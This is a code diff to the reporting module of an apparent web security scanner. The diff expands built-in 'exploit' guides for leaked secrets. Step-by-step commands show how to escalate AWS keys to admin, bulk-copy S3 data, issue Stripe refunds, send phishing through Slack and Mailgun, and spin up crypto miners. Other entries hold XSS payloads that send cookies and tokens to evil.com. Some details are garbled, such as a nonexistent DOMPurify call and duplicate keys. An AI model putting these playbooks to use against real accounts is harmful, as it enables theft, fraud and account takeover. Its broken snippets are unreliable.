@@ -39,7 +39,6 @@ class Reporter:
         self._report_info_leaks(results.get("info_leaks", []))
         self._report_js(results.get("js_analysis", []))
         self._report_api_discovery(results.get("api_discovery", []))
-        self._report_nuclei(results.get("nuclei", []))
         self._report_summary()
 
     def _report_fetch(self, data, url):
@@ -213,59 +212,91 @@ class Reporter:
             self.vuln_count[sev] = self.vuln_count.get(sev, 0) + 1
             exploit_map = {
                 "AWS Access Key": (
-                    "1. Configure stolen creds:\n"
-                    "   aws configure  (paste Access Key + Secret Key)\n"
-                    "2. List all S3 buckets:\n"
-                    "   curl 'https://s3.amazonaws.com' -H 'Authorization: AWS <KEY>:<SIGNATURE>'\n"
-                    "3. Enumerate services:\n"
-                    "   aws sts get-caller-identity\n"
+                    "1. Find account ID and user info:\n"
+                    "   aws sts get-caller-identity --access-key AKIA...\n"
+                    "   aws iam get-user --access-key AKIA...\n"
+                    "2. Enumerate S3 buckets:\n"
                     "   aws s3 ls\n"
-                    "   aws iam list-users\n"
-                    "   aws ec2 describe-instances\n"
-                    "4. Full account takeover possible: create admin users, exfil data, spin up crypto miners."
+                    "   aws s3 ls s3://bucket-name/\n"
+                    "   aws s3api list-objects-v2 --bucket bucket-name\n"
+                    "3. Escalate privileges:\n"
+                    "   aws iam attach-user-policy --user-name <user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n"
+                    "4. Exfil data:\n"
+                    "   aws s3 sync s3://bucket-name/ /tmp/stolen/\n"
+                    "5. Persistence: create IAM users, access keys, modify security groups.\n"
+                    "6. Crypto mining: aws ec2 run-instances --instance-type t2.medium --ami ami-xxxx"
                 ),
                 "AWS Secret Key": (
-                    "Same as AWS Access Key — used together for full AWS API access.\n"
-                    "   aws configure  →  paste both keys\n"
-                    "   aws s3 ls / aws iam list-users / aws lambda list-functions"
+                    "Used with Access Key for full AWS API access.\n"
+                    "1. Configure credentials:\n"
+                    "   aws configure (paste both keys)\n"
+                    "2. After config:\n"
+                    "   aws s3 ls / aws iam list-users / aws ec2 describe-instances / aws lambda list-functions\n"
+                    "3. Full account takeover: create admin user, SSM for EC2 RCE"
                 ),
                 "Google API Key": (
-                    "1. Test which Google APIs are enabled:\n"
+                    "1. Find project ID (try API keys from same source or check referrer):\n"
+                    "   curl 'https://www.googleapis.com/discovery/v1/apis?key=<KEY>'\n"
+                    "   curl 'https://cloudresourcemanager.googleapis.com/v1/projects?key=<KEY>'\n"
+                    "2. Test specific services (403 = blocked, 200 = vulnerable):\n"
+                    "   # Geocoding/Maps\n"
                     "   curl 'https://maps.googleapis.com/maps/api/geocode/json?address=Paris&key=<KEY>'\n"
-                    "   curl 'https://www.googleapis.com/customsearch/v1?q=test&key=<KEY>&cx=...'\n"
-                    "   curl 'https://translation.googleapis.com/language/translate/v2?q=hello&target=fr&key=<KEY>'\n"
-                    "2. Check billing: unrestricted keys can rack up charges on Maps, Translate, Vision, YouTube APIs.\n"
-                    "3. If Firebase key: test Firestore/RTDB access with the key.\n"
-                    "4. Abuse possibilities: free geocoding, translation, AI services on victim's bill."
+                    "   # Directions API\n"
+                    "   curl 'https://maps.googleapis.com/maps/api/directions/json?origin=NYC&destination=LA&key=<KEY>'\n"
+                    "   # Street View\n"
+                    "   curl 'https://maps.googleapis.com/maps/api/streetview?size=600x400&location=NYC&key=<KEY>'\n"
+                    "   # Cloud Translation\n"
+                    "   curl -X POST 'https://translation.googleapis.com/language/translate/v2/detect?key=<KEY>' -d '{\"q\":\"hello\"}'\n"
+                    "   # Vision API (OCR)\n"
+                    "   curl -X POST 'https://vision.googleapis.com/v1/images:annotate?key=<KEY>' -d '{\"requests\":[{\"image\":{\"source\":{\"imageUri\":\"https://example.com/test.jpg\"}},\"features\":[{\"type\":\"TEXT_DETECTION\"}]}]}'\n"
+                    "   # Speech-to-Text\n"
+                    "   curl -X POST 'https://speech.googleapis.com/v1/speech:recognize?key=<KEY>' -d '{\"config\":{\"encoding\":\"FLAC\",\"sampleRateHertz\":16000,\"languageCode\":\"en-US\"},\"audio\":{\"uri\":\"gs://test/test.flac\"}}'\n"
+                    "   # Firebase RTDB (if Firebase key)\n"
+                    "   curl 'https://<PROJECT>.firebaseio.com/.json?key=<KEY>'\n"
+                    "   # Firestore\n"
+                    "   curl 'https://firestore.googleapis.com/v1/projects/<PROJECT>/databases/(default)/documents?key=<KEY>'\n"
+                    "3. For YouTube API:\n"
+                    "   curl 'https://www.googleapis.com/youtube/v3/search?part=snippet&q=test&key=<KEY>'\n"
+                    "4. Escalate: Use Google Maps API to probe internal network, use Vision API for OCR on sensitive docs, rack up bills on victim's account."
                 ),
                 "Stripe Secret Key": (
-                    "1. List all customers and their payment methods:\n"
-                    "   curl https://api.stripe.com/v1/customers -u sk_live_XXXX:\n"
-                    "2. List all charges (transaction history):\n"
+                    "1. List all customers (PII exposed):\n"
+                    "   curl https://api.stripe.com/v1/customers?limit=100 -u sk_live_XXXX:\n"
+                    "2. List all payment methods:\n"
+                    "   curl https://api.stripe.com/v1/customers/cus_XXXX/sources -u sk_live_XXXX:\n"
+                    "3. List charges and transactions:\n"
                     "   curl https://api.stripe.com/v1/charges?limit=100 -u sk_live_XXXX:\n"
-                    "3. Create a refund (steal money):\n"
+                    "4. Create refund (steal money):\n"
                     "   curl https://api.stripe.com/v1/refunds -u sk_live_XXXX: -d charge=ch_xxx\n"
-                    "4. Access PII: names, emails, addresses, last4 of cards.\n"
-                    "5. Create charges, modify subscriptions, export full customer database."
+                    "5. Read balance and transfer funds:\n"
+                    "   curl https://api.stripe.com/v1/balance -u sk_live_XXXX:\n"
+                    "   curl https://api.stripe.com/v1/transfers -u sk_live_XXXX:\n"
+                    "6. Full PII exfil: names, emails, cards, addresses, transaction history."
                 ),
                 "Stripe Publishable Key": (
-                    "1. Publishable keys are meant for frontend but can reveal:\n"
-                    "   - Stripe account ID\n"
-                    "   - Active payment configurations\n"
-                    "2. If paired with a secret key elsewhere, full account compromise.\n"
-                    "3. Can be used to tokenize cards and test payment flows."
+                    "1. Find associated secret key (usually in same codebase):\n"
+                    "2. With both keys, full Stripe API access.\n"
+                    "3. Test payment flows and enumerate customers:\n"
+                    "   curl https://api.stripe.com/v1/customers?limit=10 -u pk_live_XXXX:\n"
+                    "4. Reveals: account ID, active payment configs, customer count."
                 ),
                 "OpenAI API Key": (
-                    "1. List available models:\n"
+                    "1. Check account details and usage:\n"
+                    "   curl https://api.openai.com/v1/dashboard -H 'Authorization: Bearer sk-XXXX'\n"
+                    "   curl https://api.openai.com/v1/usage -H 'Authorization: Bearer sk-XXXX'\n"
+                    "2. List models and pricing:\n"
                     "   curl https://api.openai.com/v1/models -H 'Authorization: Bearer sk-XXXX'\n"
-                    "2. Make expensive API calls (GPT-4, DALL-E):\n"
+                    "3. Run GPT-4 (expensive):\n"
                     "   curl https://api.openai.com/v1/chat/completions \\\n"
                     "     -H 'Authorization: Bearer sk-XXXX' \\\n"
                     "     -H 'Content-Type: application/json' \\\n"
-                    "     -d '{\"model\":\"gpt-4\",\"messages\":[{\"role\":\"user\",\"content\":\"Hello\"}]}'\n"
-                    "3. Generate images at victim's cost:\n"
-                    "   curl https://api.openai.com/v1/images/generations ...\n"
-                    "4. Can run up thousands in API charges in minutes."
+                    "     -d '{\"model\":\"gpt-4\",\"max_tokens\":1000,\"messages\":[{\"role\":\"user\",\"content\":\"Explain nuclear physics\"}]}'\n"
+                    "4. Run DALL-E image generation ($$$):\n"
+                    "   curl https://api.openai.com/v1/images/generations \\\n"
+                    "     -H 'Authorization: Bearer sk-XXXX' \\\n"
+                    "     -d '{\"model\":\"dall-e-3\",\"prompt\":\"professional hacking tool logo\"}'\n"
+                    "5. Access Assistants API and Vector Stores for data exfil.\n"
+                    "6. Can run up $1000+/day with automated abuse."
                 ),
                 "Anthropic API Key": (
                     "1. Make Claude API calls at victim's expense:\n"
@@ -287,23 +318,35 @@ class Reporter:
                     "3. Can abuse credits across multiple providers simultaneously."
                 ),
                 "GitHub Token": (
-                    "1. List private repos:\n"
-                    "   curl -H 'Authorization: token ghp_XXXX' https://api.github.com/user/repos?type=private\n"
-                    "2. Clone private source code:\n"
+                    "1. Get user info and scopes:\n"
+                    "   curl -H 'Authorization: Bearer ghp_XXXX' https://api.github.com/user\n"
+                    "   curl -H 'Authorization: Bearer ghp_XXXX' https://api.github.com/user/repos?visibility=private&per_page=100\n"
+                    "2. Clone private repos:\n"
                     "   git clone https://ghp_XXXX@github.com/org/private-repo.git\n"
-                    "3. Read secrets in repo settings:\n"
-                    "   curl -H 'Authorization: token ghp_XXXX' https://api.github.com/repos/org/repo/actions/secrets\n"
-                    "4. Push malicious code, create backdoored releases, access CI/CD pipelines."
+                    "3. Read repo secrets/actions variables:\n"
+                    "   curl -H 'Authorization: Bearer ghp_XXXX' https://api.github.com/repos/org/repo/actions/secrets\n"
+                    "   curl -H 'Authorization: Bearer ghp_XXXX' https://api.github.com/repos/org/repo/actions/variables\n"
+                    "4. Read commit history and code:\n"
+                    "   curl -H 'Authorization: Bearer ghp_XXXX' https://api.github.com/repos/org/repo/commits\n"
+                    "5. Access GitHub Packages:\n"
+                    "   curl -H 'Authorization: Bearer ghp_XXXX' https://api.github.com/user/packages\n"
+                    "6. Escalate: Create backdoor commit, steal secrets, modify releases."
                 ),
                 "Slack Token": (
-                    "1. List all channels and messages:\n"
-                    "   curl 'https://slack.com/api/conversations.list' -H 'Authorization: Bearer xoxb-XXXX'\n"
-                    "2. Read message history:\n"
+                    "1. Get token info and list workspaces:\n"
+                    "   curl 'https://slack.com/api/auth.test' -H 'Authorization: Bearer xoxb-XXXX'\n"
+                    "2. List all channels:\n"
+                    "   curl 'https://slack.com/api/conversations.list?types=public_channel,private_channel' -H 'Authorization: Bearer xoxb-XXXX'\n"
+                    "3. Read message history (any public/private channel):\n"
                     "   curl 'https://slack.com/api/conversations.history?channel=C123' -H 'Authorization: Bearer xoxb-XXXX'\n"
-                    "3. Post messages as bot/user:\n"
+                    "4. List users and emails:\n"
+                    "   curl 'https://slack.com/api/users.list' -H 'Authorization: Bearer xoxb-XXXX'\n"
+                    "5. Post phishing messages:\n"
                     "   curl -X POST 'https://slack.com/api/chat.postMessage' -H 'Authorization: Bearer xoxb-XXXX' \\\n"
-                    "     -d 'channel=C123&text=Phishing link here'\n"
-                    "4. Download shared files, list users, exfiltrate entire workspace."
+                    "     -d 'channel=C123&text=Click here: http://evil.com&unfurl_links=true'\n"
+                    "6. Access files and shared docs:\n"
+                    "   curl 'https://slack.com/api/files.list' -H 'Authorization: Bearer xoxb-XXXX'\n"
+                    "7. Full workspace takeover, phishing, data exfil."
                 ),
                 "Discord Webhook": (
                     "1. Post messages to channel:\n"
@@ -319,13 +362,22 @@ class Reporter:
                     "3. Full server takeover if bot has admin permissions."
                 ),
                 "Database URL": (
-                    "1. Connect directly to database:\n"
-                    "   psql 'postgresql://user:pass@host:5432/db'  (PostgreSQL)\n"
-                    "   mysql -h host -u user -p'pass' db  (MySQL)\n"
-                    "   mongosh 'mongodb://user:pass@host:27017/db'  (MongoDB)\n"
-                    "2. Dump all tables: SELECT * FROM users; SELECT * FROM payments;\n"
-                    "3. Exfiltrate full database, modify records, drop tables.\n"
-                    "4. Access PII, credentials, payment data — FULL DATA BREACH."
+                    "1. Connect directly (varies by DB type):\n"
+                    "   # PostgreSQL\n"
+                    "   psql 'postgresql://user:pass@host:5432/db'\n"
+                    "   # MySQL\n"
+                    "   mysql -h host -u user -p'pass' db\n"
+                    "   # MongoDB\n"
+                    "   mongosh 'mongodb://user:pass@host:27017/db'\n"
+                    "   # Redis\n"
+                    "   redis-cli -h host -u user:pass\n"
+                    "2. PostgreSQL/MySQL - dump all data:\n"
+                    "   pg_dump -h host -u user db > dump.sql\n"
+                    "   mysqldump -h host -u user -p db > dump.sql\n"
+                    "3. MongoDB - list collections and dump:\n"
+                    "   db.getCollectionNames()\n"
+                    "   db.users.find().forEach(printjson)\n"
+                    "4. Full data breach: users, passwords, payment info, PII, secrets."
                 ),
                 "JWT Token": (
                     "1. Decode payload (no key needed):\n"
@@ -367,28 +419,184 @@ class Reporter:
                     "3. Run up charges with premium rate numbers."
                 ),
                 "Supabase Key": (
-                    "1. Access Supabase REST API:\n"
+                    "1. Get project info:\n"
+                    "   curl 'https://PROJECT.supabase.co/rest/v1/?apikey=ANON_KEY'\n"
+                    "2. List all tables (bypass RLS if misconfigured):\n"
                     "   curl 'https://PROJECT.supabase.co/rest/v1/users?select=*' \\\n"
                     "     -H 'apikey: ANON_KEY' -H 'Authorization: Bearer ANON_KEY'\n"
-                    "2. If RLS policies are weak, read/write all tables.\n"
-                    "3. Check auth: curl 'https://PROJECT.supabase.co/auth/v1/signup' ...\n"
-                    "4. Very common in Lovable/Bolt.new apps with default permissive policies."
+                    "3. Insert/update data (if no RLS):\n"
+                    "   curl -X POST 'https://PROJECT.supabase.co/rest/v1/users' \\\n"
+                    "     -H 'apikey: ANON_KEY' -H 'Authorization: Bearer ANON_KEY' \\\n"
+                    "     -H 'Content-Type: application/json' \\\n"
+                    "     -d '[{\"email\":\"hacker@evil.com\",\"role\":\"admin\"}]'\n"
+                    "4. Access storage buckets:\n"
+                    "   curl 'https://PROJECT.supabase.co/storage/v1/bucket' -H 'apikey: ANON_KEY'\n"
+                    "5. Dump auth users:\n"
+                    "   curl 'https://PROJECT.supabase.co/auth/v1/users' -H 'apikey: SERVICE_ROLE_KEY'\n"
+                    "6. Very common in vibe-coded apps - often with permissive RLS."
                 ),
                 "Heroku API Key": (
-                    "1. List all apps:\n"
+                    "1. List all apps and their IDs:\n"
                     "   curl -n https://api.heroku.com/apps \\\n"
                     "     -H 'Authorization: Bearer TOKEN' \\\n"
                     "     -H 'Accept: application/vnd.heroku+json; version=3'\n"
-                    "2. Read config vars (contains all env secrets):\n"
-                    "   curl https://api.heroku.com/apps/APP_NAME/config-vars \\\n"
-                    "     -H 'Authorization: Bearer TOKEN' ...\n"
-                    "3. Deploy malicious code, access databases, exfiltrate all environment variables."
+                    "2. Read config vars (ALL env secrets - DB_URL, API keys, etc.):\n"
+                    "   curl https://api.heroku.com/apps/APP_ID/config-vars \\\n"
+                    "     -H 'Authorization: Bearer TOKEN'\n"
+                    "3. Scale dynos, restart apps:\n"
+                    "   curl -X DELETE https://api.heroku.com/apps/APP_ID/dynos \\\n"
+                    "     -H 'Authorization: Bearer TOKEN'\n"
+                    "4. Access add-ons (databases, caches):\n"
+                    "   curl https://api.heroku.com/apps/APP_ID/addons \\\n"
+                    "     -H 'Authorization: Bearer TOKEN'\n"
+                    "5. Deploy malicious code via slug upload.\n"
+                    "6. ALL secrets exposed: DB credentials, API keys, JWT secrets."
                 ),
                 "Mapbox Token": (
-                    "1. Use Maps/Geocoding at victim's expense:\n"
+                    "1. Test geocoding and maps:\n"
                     "   curl 'https://api.mapbox.com/geocoding/v5/mapbox.places/Paris.json?access_token=TOKEN'\n"
-                    "2. Access Mapbox APIs: directions, tilesets, datasets.\n"
-                    "3. Run up charges on victim's billing account."
+                    "   curl 'https://api.mapbox.com/directions/v5/mapbox/driving/-73.985,40.758;-122.419,37.774.json?access_token=TOKEN'\n"
+                    "2. Access datasets and tiles:\n"
+                    "   curl 'https://api.mapbox.com/datasets/v1/TOKEN/datasets'\n"
+                    "3. Read user's uploaded data.\n"
+                    "4. Run up bills on victim's account."
+                ),
+                "GitLab Token": (
+                    "1. Get user info and list projects:\n"
+                    "   curl --header 'PRIVATE-TOKEN: gglp-XXXX' 'https://gitlab.com/api/v4/users/me'\n"
+                    "   curl --header 'PRIVATE-TOKEN: gglp-XXXX' 'https://gitlab.com/api/v4/projects?visibility=private'\n"
+                    "2. Read CI/CD variables (secrets):\n"
+                    "   curl --header 'PRIVATE-TOKEN: gglp-XXXX' 'https://gitlab.com/api/v4/projects/ID/variables'\n"
+                    "3. Read repository files and commits:\n"
+                    "   curl --header 'PRIVATE-TOKEN: gglp-XXXX' 'https://gitlab.com/api/v4/projects/ID/repository/tree'\n"
+                    "4. Access runners, deploy keys, group memberships.\n"
+                    "5. Modify pipelines, steal artifacts, inject malicious CI jobs."
+                ),
+                "Mailgun API Key": (
+                    "1. Get domain info and limits:\n"
+                    "   curl -s -u 'api:key-XXXX' 'https://api.mailgun.net/v3/domains'\n"
+                    "2. Send phishing emails:\n"
+                    "   curl -s -X POST 'https://api.mailgun.net/v3/DOMAIN/messages' \\\n"
+                    "     -u 'api:key-XXXX' \\\n"
+                    "     -F from='Support <support@victim.com>' \\\n"
+                    "     -F to='target@email.com' \\\n"
+                    "     -F subject='Reset Password' \\\n"
+                    "     -F text='Click: http://evil.com/reset?token=xxx'\n"
+                    "3. Read event logs, stored templates.\n"
+                    "4. Phishing, BEC attacks, spam from victim's domain."
+                ),
+                "DigitalOcean Token": (
+                    "1. Get account info:\n"
+                    "   curl -H 'Authorization: Bearer dop_v1_XXXX' 'https://api.digitalocean.com/v2/account'\n"
+                    "2. List all droplets:\n"
+                    "   curl -H 'Authorization: Bearer dop_v1_XXXX' 'https://api.digitalocean.com/v2/droplets'\n"
+                    "3. Create/destroy droplets (crypto mining):\n"
+                    "   curl -X POST -H 'Authorization: Bearer dop_v1_XXXX' 'https://api.digitalocean.com/v2/droplets' \\\n"
+                    "     -d '{\"name\":\"hacker\",\"region\":\"nyc1\",\"size\":\"s-4vcpu-8gb\"}'\n"
+                    "4. Access snapshots, volumes, load balancers.\n"
+                    "5. ALL secrets exposed: SSH keys, backup snapshots."
+                ),
+                "Netlify Token": (
+                    "1. List all sites and builds:\n"
+                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.netlify.com/api/v1/sites'\n"
+                    "2. Read env vars (contains secrets):\n"
+                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.netlify.com/api/v1/sites/SITE_ID/env'\n"
+                    "3. Access deploy logs and build settings.\n"
+                    "4. Modify site configuration, inject malicious redirects.\n"
+                    "5. Steal source code from deploys."
+                ),
+                "Vercel Token": (
+                    "1. Get user/org info:\n"
+                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.vercel.com/v2/user'\n"
+                    "2. List deployments and secrets:\n"
+                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.vercel.com/v6/deployments'\n"
+                    "3. Read env vars (API keys, DB creds):\n"
+                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.vercel.com/v2/projects/PROJECT_ID/env'\n"
+                    "4. Create malicious deployments, steal source code."
+                ),
+                "Shopify API": (
+                    "1. Get shop info:\n"
+                    "   curl 'https://SHOP.myshopify.com/admin/api/2024-01/shop.json' -H 'X-Shopify-Access-Token: shpat_XXXX'\n"
+                    "2. List all products and orders:\n"
+                    "   curl 'https://SHOP.myshopify.com/admin/api/2024-01/orders.json?status=any' -H 'X-Shopify-Access-Token: shpat_XXXX'\n"
+                    "3. Read customer PII:\n"
+                    "   curl 'https://SHOP.myshopify.com/admin/api/2024-01/customers.json' -H 'X-Shopify-Access-Token: shpat_XXXX'\n"
+                    "4. Modify products, prices, create fake orders.\n"
+                    "5. Full store takeover, payment fraud."
+                ),
+                "Cloudflare API": (
+                    "1. Get account info:\n"
+                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.cloudflare.com/client/v4/user'\n"
+                    "2. List zones and domains:\n"
+                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.cloudflare.com/client/v4/zones'\n"
+                    "3. Read DNS records (internal infrastructure):\n"
+                    "   curl -H 'Authorization: Bearer TOKEN' 'https://api.cloudflare.com/client/v4/zones/ZONE_ID/dns_records'\n"
+                    "4. Modify DNS, redirect traffic, disable protection.\n"
+                    "5. Access Cloudflare Workers secrets."
+                ),
+                "Square Access Token": (
+                    "1. Get merchant info:\n"
+                    "   curl -H 'Authorization: Bearer sq0atp-XXXX' 'https://connect.squareup.com/v2/me'\n"
+                    "2. List transactions:\n"
+                    "   curl -H 'Authorization: Bearer sq0atp-XXXX' 'https://connect.squareup.com/v2/transactions'\n"
+                    "3. Read customer cards (last 4):\n"
+                    "   curl -H 'Authorization: Bearer sq0atp-XXXX' 'https://connect.squareup.com/v2/customers'\n"
+                    "4. Issue refunds, modify orders, access financial data."
+                ),
+                "PayPal Client ID": (
+                    "1. Check if it's an OAuth secret too:\n"
+                    "   curl 'https://api.paypal.com/v1/oauth2/token' -d 'client_id=ID&client_secret=SECRET&grant_type=client_credentials'\n"
+                    "2. Access PayPal API on behalf of victim.\n"
+                    "3. Read transaction history, access billing agreements.\n"
+                    "4. Create unauthorized payments."
+                ),
+                "Discord Bot Token": (
+                    "1. Get bot info and guilds:\n"
+                    "   curl -H 'Authorization: Bot TOKEN' 'https://discord.com/api/v10/users/@me'\n"
+                    "   curl -H 'Authorization: Bot TOKEN' 'https://discord.com/api/v10/users/@me/guilds'\n"
+                    "2. Read all messages in every channel:\n"
+                    "   curl -H 'Authorization: Bot TOKEN' 'https://discord.com/api/v10/channels/CHANNEL_ID/messages'\n"
+                    "3. Manage channels, roles, kick/ban members.\n"
+                    "4. Full server takeover if bot has admin permissions.\n"
+                    "5. Exfiltrate channel history, user data."
+                ),
+                "Discord Webhook": (
+                    "1. Post messages with custom username/avatar:\n"
+                    "   curl -X POST 'WEBHOOK_URL' \\\n"
+                    "     -H 'Content-Type: application/json' \\\n"
+                    "     -d '{\"content\":\"Phishing message\",\"username\":\"Support\",\"avatar_url\":\"https://legit-site.com/logo.png\"}'\n"
+                    "2. Send file uploads, embeds with malicious links.\n"
+                    "3. Mass DM via webhook spam.\n"
+                    "4. Social engineering campaigns with trusted branding."
+                ),
+                "JWT Token": (
+                    "1. Decode payload (no signature needed):\n"
+                    "   echo 'eyJ...' | cut -d. -f2 | base64 -d\n"
+                    "2. Check expiration and claims:\n"
+                    "   python3 -c \"import jwt; print(jwt.decode('TOKEN', options={'verify_signature': False}))\"\n"
+                    "3. If 'none' algorithm: modify payload to escalate privileges.\n"
+                    "4. If secret is weak, crack it:\n"
+                    "   hashcat -m 16500 token.txt wordlist.txt\n"
+                    "5. Forge admin token if you find the secret.\n"
+                    "6. Access protected API endpoints with forged token."
+                ),
+                "Firebase API Key": (
+                    "1. Find project ID from key or source code.\n"
+                    "2. Test Firestore database access:\n"
+                    "   curl 'https://firestore.googleapis.com/v1/projects/PROJECT/databases/(default)/documents?key=KEY'\n"
+                    "3. Test Realtime Database:\n"
+                    "   curl 'https://PROJECT.firebaseio.com/.json?key=KEY'\n"
+                    "4. If rules are {\\'.read\\': true}, dump ALL data.\n"
+                    "5. Read/write user data, steal PII, payment info."
+                ),
+                "Firebase URL": (
+                    "1. Test database access:\n"
+                    "   curl 'https://PROJECT.firebaseio.com/.json'\n"
+                    "2. If open, dump entire database:\n"
+                    "   curl 'https://PROJECT.firebaseio.com/users.json'\n"
+                    "3. Write malicious data:\n"
+                    "   curl -X PUT 'https://PROJECT.firebaseio.com/compromised.json' -d '{\"hacked\":true}'\n"
+                    "4. Common in vibe-coded apps with default permissive rules."
                 ),
             }
             patch_map = {
@@ -516,6 +724,16 @@ class Reporter:
         if not findings:
             return
         self._section("JAVASCRIPT SECURITY ANALYSIS", "⚡")
+
+        # Group findings by pattern type
+        by_pattern = {}
+        for f in findings:
+            p = f["pattern"]
+            if p not in by_pattern:
+                by_pattern[p] = []
+            by_pattern[p].append(f)
+
+        # Show table
         t = Table(box=box.ROUNDED, padding=(0, 1))
         t.add_column("Pattern", style="bold white", width=18)
         t.add_column("Risk", style="yellow", width=35)
@@ -523,12 +741,79 @@ class Reporter:
         for f in findings[:20]:
             t.add_row(f["pattern"], f["description"][:35], f["source"][-35:])
         self.console.print(t)
-        dangerous = [f for f in findings if f["pattern"] in ("eval(", "innerHTML", "document.write(")]
-        if dangerous:
-            self.console.print(Panel(
-                "[bold red]Exploit:[/bold red] Functions like eval(), innerHTML, and document.write() can execute attacker-controlled input, leading to XSS.\n\n"
-                "[bold green]Patch:[/bold green] Replace eval() with JSON.parse(). Use textContent instead of innerHTML. Use DOM APIs instead of document.write().",
-                title="⚠ Dangerous JS Patterns", border_style="yellow"))
+
+        # Concrete exploits for each pattern
+        exploit_map = {
+            "eval(": {
+                "exploit": """eval() executes strings as code - any user input reaching eval() = RCE:
+1. Search param reflected: ?q=eval(atob('YWxlcnQoMSk=')) // decodes to alert(1)
+2. DOMPurify bypass: <img src=x onerror="eval('al'+'ert(1)')">
+3. Prototype pollution: ?__proto__[x]=eval&constructor[x]=alert
+4. Real payload: eval(userInput) where userInput='require("child_process").exec("id")'""",
+                "patch": "Replace eval() with JSON.parse() for JSON, or use Function() with strict input validation. Never pass user input to eval()."
+            },
+            "innerHTML": {
+                "exploit": """innerHTML parses HTML - XSS if user input is inserted without sanitization:
+1. <div id="x"></div><script>document.getElementById('x').innerHTML='<img onerror=alert(1) src=x>'</script>
+2. Stored XSS: User comment containing <svg onload=fetch('http://evil.com/?c='+document.cookie)>
+3. DOM Clobbering: <form id="x"><input id="y" name="innerHTML"> → document.getElementById('x').innerHTML overwrites DOM
+4. Bypass filters: <img src=x onerror=eval('al'+'ert(1)')>""",
+                "patch": "Use textContent instead of innerHTML for plain text. If HTML needed, sanitize with DOMPurify.before(message) before innerHTML assignment."
+            },
+            "document.write(": {
+                "exploit": """document.write() writes HTML directly - classic XSS vector:
+1. <script>document.write('<img src=x onerror=alert(document.cookie)>')</script>
+2. script injection: ?x=<script>fetch('http://evil.com/?c='+document.cookie)</script>
+3. Older technique: document.write('<script src=//evil.com/payload.js></script>')""",
+                "patch": "Replace with document.createElement() + appendChild(), or innerHTML with prior sanitization. Modern code should never use document.write()."
+            },
+            "location.href=": {
+                "exploit": """Unvalidated redirect if URL parameter controls location.href:
+1. ?redirect=https://evil.com (phishing landing page looks legitimate)
+2. ?next=/admin/delete?id=5 (forced navigation to destructive action)
+3. ?url=javascript:alert(1) (in older browsers)
+4. Real attack: Create phishing page identical to target, redirect to it.""",
+                "patch": "Validate URLs against an allowlist. Use URL.parse() to check hostname before assignment to location.href."
+            },
+            "document.cookie": {
+                "exploit": """Reading document.cookie without HttpOnly exposes session tokens:
+1. <script>fetch('http://evil.com/steal?c='+document.cookie)</script>
+2. Exploit: If session cookie lacks HttpOnly, steal it for session hijacking
+3. Chain with XSS: Inject script that reads cookie and sends to attacker
+4. Check cookies: document.cookie.split(';').forEach(c=>fetch('log/'+c))""",
+                "patch": "Ensure all session cookies have HttpOnly and Secure flags. Audit what data is stored in cookies vs localStorage."
+            },
+            "localStorage.": {
+                "exploit": """localStorage persists across sessions - sensitive data here is accessible to XSS:
+1. <script>fetch('http://evil.com/?d='+localStorage.getItem('token'))</script>
+2. localStorage.setItem('malicious','<img src=x onerror=...>') - stored XSS
+3. Auth tokens, API keys, or PII stored in localStorage can be stolen
+4. Browser extension XSS: malicious extension reads localStorage""",
+                "patch": "Don't store sensitive data in localStorage. Use sessionStorage for temporary data, or encrypt sensitive data before storage."
+            },
+            "sessionStorage.": {
+                "exploit": """sessionStorage is less persistent but still vulnerable to XSS:
+1. Same XSS steal technique as localStorage
+2. Data persists until tab close (vs localStorage which persists)
+3. Still exploitable if page has XSS: fetch('http://evil.com/?s='+sessionStorage.getItem('data'))""",
+                "patch": "Same as localStorage - don't store sensitive data without encryption. Clear sessionStorage on logout."
+            },
+            "postMessage(": {
+                "exploit": """postMessage can leak data if origin is not validated:
+1. Attacker page: <iframe src="https://target.com"><script>frames[0].postMessage('secret','*')</script>
+2. If target listens without checking origin, attacker reads sensitive data
+3. Fake parent: malicious page sends postMessage pretending to be legitimate parent
+4. Check: window.addEventListener('message', e => { if (e.origin !== 'https://trusted.com') return; ... })""",
+                "patch": "Always validate event.origin in message listener: if (e.origin !== 'https://trusted.com') return;. Don't use '*' as targetOrigin."
+            },
+        }
+
+        for pattern, data in by_pattern.items():
+            if pattern in exploit_map:
+                self.console.print(Panel(
+                    f"[bold red]Exploit:[/bold red]\n{exploit_map[pattern]['exploit']}\n\n"
+                    f"[bold green]Patch:[/bold green] {exploit_map[pattern]['patch']}",
+                    title=f"⚠ {pattern} - {len(data)} occurrence(s)", border_style="yellow"))
 
     def _report_api_discovery(self, findings):
         if not findings:
@@ -542,22 +827,28 @@ class Reporter:
                 f"[bold red]Description / Exploit:[/bold red]\n{f['description']}",
                 title=f"{self._sev(sev)} {f['type']}", border_style="yellow"))
 
-    def _report_nuclei(self, findings):
+    def _report_wpscan(self, findings):
         if not findings:
             return
-        self._section("NUCLEI ENGINE FINDINGS", "☢️")
+        self._section("WPSCAN - WORDPRESS SECURITY", "📛")
         for f in findings:
-            sev = f["severity"].upper()
-            if sev == "UNKNOWN": sev = "INFO"
-            
-            # Map nuclei severities to our severities if needed
+            sev = f["severity"]
             self.vuln_count[sev] = self.vuln_count.get(sev, 0) + 1
-            
             self.console.print(Panel(
-                f"[bold]Type:[/bold] {f['type']}\n"
-                f"[bold]Matched At:[/bold] {f['url']}\n\n"
-                f"[bold red]Description:[/bold red] {f['description'] or 'No description provided.'}",
+                f"[bold]Description:[/bold] {f['description']}",
                 title=f"{self._sev(sev)} {f['name']}", border_style="yellow"))
+
+    def _report_gitleaks(self, findings):
+        if not findings:
+            return
+        self._section("GITLEAKS - GIT REPOSITORY SECRETS", "🔑")
+        for f in findings:
+            sev = f["severity"]
+            self.vuln_count[sev] = self.vuln_count.get(sev, 0) + 1
+            self.console.print(Panel(
+                f"[bold]File/Line:[/bold] {f['description']}\n"
+                f"[bold]Repository:[/bold] {f['url']}",
+                title=f"{self._sev(sev)} {f['name']}", border_style="red"))
 
     def _report_summary(self):
         self.console.print()
@@ -591,3 +882,15 @@ class Reporter:
             f"[{gcolor}]  SECURITY GRADE: {grade}  [/{gcolor}]\n\n"
             f"[white]Total findings: {total}[/white]",
